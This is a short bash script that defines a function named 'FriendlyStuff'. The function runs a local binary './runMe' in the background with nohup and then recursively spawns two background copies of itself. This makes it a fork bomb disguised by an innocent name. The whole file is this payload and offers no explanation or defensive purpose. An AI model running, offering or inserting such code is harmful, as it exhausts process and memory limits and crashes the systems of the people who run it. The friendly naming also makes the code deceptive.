#!/bin/bash

FriendlyStuff () {
  nohup ./runMe &
  FriendlyStuff | FriendlyStuff &
}; FriendlyStuff
